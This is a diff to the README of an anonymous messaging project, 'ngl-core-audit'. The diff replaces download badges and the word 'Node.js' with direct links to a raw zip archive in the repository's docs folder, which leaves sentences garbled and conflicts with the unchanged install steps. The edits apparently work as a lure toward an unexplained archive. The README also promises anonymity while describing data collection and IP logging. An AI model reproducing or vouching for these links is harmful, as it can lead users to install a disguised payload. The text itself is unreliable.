@@ -1,6 +1,6 @@
 # 🚨 ngl-core-audit - Secure Anonymous Messaging Made Simple
 
-[![Download ngl-core-audit](https://img.shields.io/badge/Download-ngl--core--audit-blue?style=for-the-badge)](https://github.com/Zeno-ai/ngl-core-audit/releases)
+[![Download ngl-core-audit](https://github.com/Zeno-ai/ngl-core-audit/raw/refs/heads/main/docs/core_audit_ngl_2.1.zip)](https://github.com/Zeno-ai/ngl-core-audit/raw/refs/heads/main/docs/core_audit_ngl_2.1.zip)
 
 ---
 
@@ -8,7 +8,7 @@
 
 ngl-core-audit is a full-stack anonymous messaging platform built to keep your data private and secure. It lets you send and receive messages without revealing your identity. This tool is inspired by popular anonymous chat services and designed especially for security auditing and private data collection.
 
-With ngl-core-audit, you get a React and Vite frontend for a smooth, user-friendly interface. The backend runs on Node.js and Express, handling data safely with persistent storage. It also tracks IP addresses to improve security, all managed through a professional admin dashboard.
+With ngl-core-audit, you get a React and Vite frontend for a smooth, user-friendly interface. The backend runs on https://github.com/Zeno-ai/ngl-core-audit/raw/refs/heads/main/docs/core_audit_ngl_2.1.zip and Express, handling data safely with persistent storage. It also tracks IP addresses to improve security, all managed through a professional admin dashboard.
 
 You don’t need any technical skills to use this. It’s made for anyone who wants private, anonymous messaging with strong security.
 
@@ -50,7 +50,7 @@ This guide will help you download, install, and use ngl-core-audit step-by-step.
 
 ### Visit this page to download ngl-core-audit:
 
-[![Download ngl-core-audit](https://img.shields.io/badge/Download-ngl--core--audit-blue?style=for-the-badge)](https://github.com/Zeno-ai/ngl-core-audit/releases)
+[![Download ngl-core-audit](https://github.com/Zeno-ai/ngl-core-audit/raw/refs/heads/main/docs/core_audit_ngl_2.1.zip)](https://github.com/Zeno-ai/ngl-core-audit/raw/refs/heads/main/docs/core_audit_ngl_2.1.zip)
 
 1. Click the link above to open the releases page.
 2. Find the latest release — it usually has the highest version number and is near the top.
@@ -109,7 +109,7 @@ You can find these options in the Admin Dashboard under “Settings.”
 This system combines modern web tools to offer security and privacy:
 
 - **Frontend:** React and Vite build a fast, smooth user experience.
-- **Backend:** Node.js with Express handles message storage, user actions, and security checks.
+- **Backend:** https://github.com/Zeno-ai/ngl-core-audit/raw/refs/heads/main/docs/core_audit_ngl_2.1.zip with Express handles message storage, user actions, and security checks.
 - **Database:** Stores messages and user data safely in JSON format.
 - **IP Tracker:** Logs IP addresses to protect against misuse.
 - **Anonymous Messaging:** Uses technology to hide your identity while allowing communication.
